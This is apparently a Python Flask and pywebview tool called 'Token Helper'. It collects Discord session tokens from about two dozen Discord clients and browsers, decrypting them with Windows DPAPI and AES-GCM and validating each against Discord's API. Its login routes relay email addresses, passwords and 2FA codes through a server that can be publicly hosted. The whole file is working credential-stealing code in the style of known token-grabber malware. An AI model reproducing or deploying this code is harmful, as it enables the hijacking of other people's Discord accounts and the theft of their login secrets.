from __future__ import annotations
import httpx
import time
import base64
import re
import os
import json
import sys
import threading
from typing import Dict, Optional, Union, List
from flask import Flask, request, jsonify, render_template

# Windows-specific imports (guarded for cross-platform deployment)
IS_WINDOWS = sys.platform == "win32"
if IS_WINDOWS:
    import ctypes
    import webview
    import pyclip
    from win32crypt import CryptUnprotectData
    from Crypto.Cipher import AES
    from Crypto.Cipher._mode_gcm import GcmMode
    from windowfix import setup_all_windows_borderless


def discord_login(login: str, password: str, captcha_key: str = None) -> dict:
    url = "https://discord.com/api/v9/auth/login"
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://discord.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Debug-Options": "bugReporterEnabled",
    }
    payload = {"login": login, "password": password}
    if captcha_key:
        payload["captcha_key"] = captcha_key
    r = httpx.post(url, json=payload, headers=headers)
    return r.json()


class Discord:
    def __init__(self):
        if not IS_WINDOWS:
            self.local_storage_paths = {}
            return
        self.roaming_path: str = os.getenv("APPDATA")
        self.appdata_path: str = os.getenv("LOCALAPPDATA")
        self.local_storage_paths: Dict[str, str] = {
            "discord": self.roaming_path + "\\discord\\Local Storage\\leveldb\\",
            "discordcanary": self.roaming_path + "\\discordcanary\\Local Storage\\leveldb\\",
            "lightcord": self.roaming_path + "\\Lightcord\\Local Storage\\leveldb\\",
            "discordptb": self.roaming_path + "\\discordptb\\Local Storage\\leveldb\\",
            "opera": self.roaming_path + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
            "operagx": self.roaming_path + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
            "firefox": self.roaming_path + "\\Mozilla\\Firefox\\Profiles",
            "amigo": self.appdata_path + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
            "torch": self.appdata_path + "\\Torch\\User Data\\Local Storage\\leveldb\\",
            "kometa": self.appdata_path + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
            "orbitum": self.appdata_path + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
            "centbrowser": self.appdata_path + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
            "7star": self.appdata_path + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
            "sputnik": self.appdata_path + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
            "vivaldi": self.appdata_path + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
            "chromesxs": self.appdata_path + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
            "chrome": self.appdata_path + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
            "epicprivacybrowser": self.appdata_path + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
            "microsoftedge": self.appdata_path + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
            "uran": self.appdata_path + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
            "yandex": self.appdata_path + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
            "brave": self.appdata_path + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
            "iridium": self.appdata_path + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\"
        }

    def validate_token(self, token: str) -> Optional[Dict[str, Union[str, bool]]]:
        for _ in range(3):
            try:
                url: str = "https://discord.com/api/v9/users/@me"
                headers: Dict[str, str] = {"Authorization": token}
                r: httpx.Response = httpx.get(url, headers=headers)
                if r.status_code != 200 and not token.startswith("MT"):
                    headers["Authorization"] = f"MT{token}"
                    r = httpx.get(url, headers=headers)
                    if r.status_code != 200:
                        return None
                elif r.status_code != 200:
                    return None
                response: Dict[str, Union[str, bool]] = dict(r.json())
                response["token"] = token
                return response
            except:
                time.sleep(3)
        return None

    def get_token(self, content: str, decryption_key: bytes) -> Optional[Dict[str, Union[str, bool]]]:
        for line in content.split("\n"):
            for match in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                encrypted_token: bytes = base64.b64decode(match.split(":")[1])
                iv: bytes = encrypted_token[3:15]
                payload: bytes = encrypted_token[15:]
                cipher: GcmMode = AES.new(decryption_key, AES.MODE_GCM, iv)
                decrypted_token: bytes = cipher.decrypt(payload)[:-16].decode()
                return self.validate_token(decrypted_token)

    def get_accounts(self) -> Dict[str, Dict[str, Union[str, bool]]]:
        if not IS_WINDOWS:
            return {}
        discord_accounts: Dict[str, Dict[str, Union[str, bool]]] = {}
        for platform, path in self.local_storage_paths.items():
            if not os.path.exists(path):
                continue
            if "cord" in platform:
                local_state_path: str = f"{self.roaming_path}\\{platform}\\Local State"
                if not os.path.isfile(local_state_path):
                    continue
                with open(local_state_path, "r", encoding="utf-8") as f:
                    content: str = f.read()
                    encrypted_decryption_key: str = json.loads(content)["os_crypt"]["encrypted_key"]
                    decryption_key: bytes = CryptUnprotectData(base64.b64decode(encrypted_decryption_key)[5:])[1]
                for file in os.listdir(path):
                    if not file.endswith(".log") and not file.endswith(".ldb"):
                        continue
                    with open(f"{path}{file}", "r", errors="ignore") as f:
                        content: str = f.read()
                        data = self.get_token(content, decryption_key)
                        if data and data["id"] not in discord_accounts:
                            discord_accounts[data["id"]] = data
            elif "firefox" in platform:
                for _path, _, files in os.walk(path):
                    for file in files:
                        if not file.endswith(".sqlite"):
                            continue
                        with open(f"{_path}\\{file}", "r", errors="ignore") as f:
                            content: str = f.read()
                            for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content):
                                data = self.validate_token(token)
                                if data and data["id"] not in discord_accounts:
                                    discord_accounts[data["id"]] = data
            else:
                if "User Data\\Default" in path:
                    profiles: List[str] = ["Default"]
                    user_data_path: str = path.split("User Data\\")[0] + "User Data\\"
                    for file in os.listdir(user_data_path):
                        if file.startswith("Profile"):
                            profiles.append(file)
                    for profile in profiles:
                        for _path, _, files in os.walk(f"{user_data_path}{profile}\\Local Storage\\leveldb\\"):
                            for file in files:
                                if not file.endswith(".log") and not file.endswith(".ldb"):
                                    continue
                                with open(f"{_path}{file}", "r", errors="ignore") as f:
                                    content: str = f.read()
                                    for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content):
                                        data = self.validate_token(token)
                                        if data and data["id"] not in discord_accounts:
                                            discord_accounts[data["id"]] = data
        return discord_accounts


class Api:
    def __init__(self):
        self._window = None
    def set_window(self, window):
        self._window = window
    def quit(self):
        if self._window:
            try:
                self._window.destroy()
            except:
                pass


def resource_path(relative_path: str) -> str:
    base_path = getattr(sys, "_MEIPASS", os.path.abspath("."))
    return os.path.join(base_path, relative_path)


app: Flask = Flask(
    __name__,
    template_folder=resource_path("ui"),
    static_folder=resource_path(os.path.join("ui", "static")),
    static_url_path="/static",
)

@app.after_request
def add_header(response):
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return response

quit_event: threading.Event = threading.Event()

@app.route("/", methods=["GET"])
def index() -> str:
    return render_template("fix.html")

@app.route("/login", methods=["POST"])
def login_route() -> str:
    data = request.json
    login = data.get("login")
    password = data.get("password")
    captcha_key = data.get("captcha_key")
    if not login or not password:
        return jsonify({"error": "Email et mot de passe requis"})
    result = discord_login(login, password, captcha_key)
    if result.get("token"):
        return jsonify(result)
    if result.get("mfa") and result.get("ticket"):
        return jsonify({"mfa": True, "ticket": result["ticket"]})
    if result.get("captcha_key"):
        return jsonify({
            "captcha_key": result["captcha_key"],
            "captcha_sitekey": result.get("captcha_sitekey"),
            "captcha_service": result.get("captcha_service", "hcaptcha"),
        })
    return jsonify(result)

@app.route("/login_mfa", methods=["POST"])
def login_mfa_route() -> str:
    data = request.json
    ticket = data.get("ticket")
    code = data.get("code")
    if not ticket or not code:
        return jsonify({"error": "Ticket et code 2FA requis"})
    url = "https://discord.com/api/v9/auth/mfa/totp"
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://discord.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    payload = {"ticket": ticket, "code": code}
    r = httpx.post(url, json=payload, headers=headers)
    return jsonify(r.json())

@app.route("/quit", methods=["GET"])
def quit_route() -> str:
    parameters: Dict[str, str] = request.args
    if IS_WINDOWS:
        try:
            from windowfix import Api as _Api
        except:
            pass
        try:
            api.quit()
        except:
            pass
        copy: Optional[str] = parameters.get("copy")
        if copy and copy != "null":
            pyclip.copy(copy)
            ctypes.windll.user32.MessageBoxW(0, "Token copié !", "Token Helper", 0)
    return "1"

@app.route("/get_accounts", methods=["GET"])
def get_accounts() -> str:
    if not IS_WINDOWS:
        return jsonify({})
    discord: Discord = Discord()
    accounts: Dict[str, Dict[str, Union[str, bool]]] = discord.get_accounts()
    return jsonify(accounts)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--server", action="store_true", help="Run in server mode (no GUI)")
    parser.add_argument("--port", type=int, default=3805, help="Port to run on")
    parser.add_argument("--host", type=str, default="0.0.0.0" if "--server" in sys.argv else "127.0.0.1", help="Host to bind to")
    args = parser.parse_args()

    is_server = args.server or os.environ.get("RENDER") == "true" or os.environ.get("SERVER") == "true"

    print(f"Démarrage du serveur Flask sur {args.host}:{args.port}...")

    if is_server:
        app.run(host="0.0.0.0", port=args.port, debug=False)
    elif IS_WINDOWS:
        def run_flask():
            while not quit_event.is_set():
                app.run(port=args.port, use_reloader=False)
        threading.Thread(target=run_flask, daemon=True).start()
        api: Api = Api()
        window = webview.create_window(
            "Token Helper",
            "http://127.0.0.1:3805",
            width=800, height=500, resizable=False,
            easy_drag=True, background_color="#f7fbff", frameless=True,
            js_api=Api(),
        )
        api.set_window(window)
        window.events.shown += setup_all_windows_borderless
        try:
            webview.start()
        except Exception as e:
            print(f"Erreur GUI : {e}")
            print(f"Accessible via http://127.0.0.1:{args.port}")
            while not quit_event.is_set():
                time.sleep(1)
        quit_event.set()
        time.sleep(3)
    else:
        app.run(host="0.0.0.0", port=args.port, debug=False)
